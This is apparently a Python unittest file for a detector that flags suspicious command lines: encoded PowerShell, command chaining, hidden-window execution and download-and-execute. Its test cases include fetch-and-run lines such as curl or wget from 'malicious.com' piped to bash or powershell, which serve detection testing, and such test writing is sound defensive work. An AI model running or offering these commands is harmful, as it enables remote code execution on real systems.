import unittest

from src.detectors.command_detector import detect_command_indicators


class TestCommandDetector(unittest.TestCase):

    def test_empty_or_none_cmdline(self):
        self.assertEqual(detect_command_indicators(None), [])
        self.assertEqual(detect_command_indicators([]), [])

    def test_benign_cmdline(self):
        cmdline = ["python", "app.py", "--verbose"]
        self.assertEqual(detect_command_indicators(cmdline), [])

    def test_encoded_command_indicators(self):
        test_cases = [
            (["powershell.exe", "-enc", "aW1wb3J0"], ["encoded_command"]),
            (["powershell.exe", "-encodedcommand", "aW1wb3J0"], ["encoded_command"]),
            (["powershell", "[System.Convert]::FromBase64String('abc')"], ["encoded_command"]),
            (["bash", "-c", "echo abc | base64 -d"], ["encoded_command"]),
        ]
        for cmdline, expected in test_cases:
            with self.subTest(cmdline=cmdline):
                indicators = detect_command_indicators(cmdline)
                self.assertIn("encoded_command", indicators)

    def test_command_chaining(self):
        test_cases = [
            (["cmd.exe", "/c", "dir && echo done"], ["command_chaining"]),
            (["sh", "-c", "ls || echo failed"], ["command_chaining"]),
        ]
        for cmdline, expected in test_cases:
            with self.subTest(cmdline=cmdline):
                indicators = detect_command_indicators(cmdline)
                self.assertIn("command_chaining", indicators)

    def test_download_and_execute(self):
        test_cases = [
            (["curl", "http://malicious.com/script.sh", "|", "bash"], ["download_and_execute"]),
            (["wget", "http://malicious.com/payload", "|", "powershell"], ["download_and_execute"]),
        ]
        for cmdline, expected in test_cases:
            with self.subTest(cmdline=cmdline):
                indicators = detect_command_indicators(cmdline)
                self.assertIn("download_and_execute", indicators)

    def test_hidden_execution(self):
        test_cases = [
            (["powershell.exe", "-windowstyle", "hidden", "-c", "Write-Host"], ["hidden_execution"]),
            (["powershell.exe", "-w", "hidden", "-c", "Write-Host"], ["hidden_execution"]),
        ]
        for cmdline, expected in test_cases:
            with self.subTest(cmdline=cmdline):
                indicators = detect_command_indicators(cmdline)
                self.assertIn("hidden_execution", indicators)

    def test_multiple_indicators(self):
        cmdline = ["powershell.exe", "-w", "hidden", "-enc", "aW1wb3J0"]
        indicators = detect_command_indicators(cmdline)
        self.assertIn("encoded_command", indicators)
        self.assertIn("hidden_execution", indicators)


if __name__ == "__main__":
    unittest.main()
